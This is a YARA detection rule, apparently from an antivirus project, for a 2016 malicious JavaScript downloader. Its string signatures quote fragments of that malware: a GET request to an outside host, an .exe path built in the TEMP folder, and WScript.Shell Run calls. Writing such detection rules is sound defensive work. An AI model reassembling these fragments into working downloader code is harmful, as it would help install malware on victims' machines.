rule sig_20160329_a4b5bf3a927cb6bf476457cd464de17d {
  meta:
    description = "datamaliciousorder - file 20160329_a4b5bf3a927cb6bf476457cd464de17d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b87e4f3777720c29fff998a0ee9df7bc6fe07bf167b35ee28d1bd50d67e34ca6"

  strings:
    $s1  = "V0[P0](\"GET\", \"http://energq.com/e3ola\", false);" fullword ascii
    $s2  = "function T() {return Z0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"94MXy0HjRGkwT2e.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Kz](P() * 11); if (V0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var Z0 = function S() {return WScript[ns](\"WScript.Shell\");}(), aO = 11;" fullword ascii
    $s5  = "function e0(X, d){k = k * 1; return X - d;};" fullword ascii
    $s6  = "function e(){return \"\" + h;};" fullword ascii
    $s7  = "function B(O){Z0[\"Run\"](O, k, k);};" fullword ascii
    $s8  = "function Rh() {return ((V == true) && (V == MC)) ? 1 : k;};" fullword ascii
    $s9  = "function Z(jK) {var A = (1, 2, 3, 4, 5, jK); return A;};" fullword ascii
    $s10 = "function ps()" fullword ascii
    $s11 = "function y(){return ns;};" fullword ascii
    $s12 = " while (fb){" fullword ascii
    $s13 = "return e0(Zp, iV);" fullword ascii
    $s14 = "var qJ = new this[\"Date\"]();" fullword ascii
    $s15 = "function P(){return 22;};" fullword ascii
    $s16 = "V = true; " fullword ascii
    $s17 = "var V = false;" fullword ascii
    $s18 = "var J0 = false;" fullword ascii
    $s19 = "var MC = false;" fullword ascii
    $s20 = "MC = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}